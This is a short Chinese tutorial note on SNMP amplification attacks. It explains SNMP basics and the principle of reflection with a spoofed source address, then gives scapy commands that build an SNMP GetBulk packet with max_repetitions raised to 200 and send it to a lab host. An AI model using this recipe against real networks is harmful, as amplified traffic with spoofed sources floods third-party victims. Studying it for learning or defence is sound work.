
# SNMP 放大攻击

* 简介
* 安装 SNMP
* scapy 构造数据包

## 简介
* 简单网络管理协议
1. Simmple Network Management Protocol
1. 一般用来监控和管理网络设备
1. 服务端口UDP 161/162
1. 管理站(manager/客户端)、被管理设备(agent/服务端)
1. 管理信息数据库(MIB) 是一个信息存储库，包含管理代理中的有关配置和性能的数据，按照不同分类，包含分属不同组的多个数据对象
1. 每一个节点都有一个对象标识符(OID) 来唯一的标识一IETF定义便准的MIB库厂家自定义MIB库

* 攻击原理
1. 请求流量小，查询结果返回流量大
2. 结合伪造源地址实现攻击

## 安装 SNMP
* 安装 SNMP，定义 community
  

## scapy 构造数据包

* 构造 IP 数据包
``` 
>>> i=IP()
>>> i.dst="10.10.10.142"
>>> i.display()

```  

* 构造 UDP 数据包
``` 
>>> u=UDP()
>>> u.dport=161
>>> u.sport=161

```  

* 构造 SNMP 数据包
``` 
>>> s=SNMP()

```  

* 设置放大倍数
``` 
>>> b=SNMPbulk()
>>> b.max_repetitions=100
>>> b.varbindlist=[SNMPvarbind(oid=ASN1_OID('1.3.6.1.2.1.1')),SNMPvarbind(oid=ASN1_OID('1.3.6.1.2.1.19.1.3'))]
>>> b.display()

```  

* 设置 SNMP 数据包
``` 
>>> r=(i/u/s)
>>> r.display()

```  

* 测试放大200倍效果
``` 
>>> b.max_repetitions=200
>>> s.PDU=b
>>> s.display()

```  
``` 
>>> r=(i/u/s)
>>> r.display()
>>> sr1(r)

```


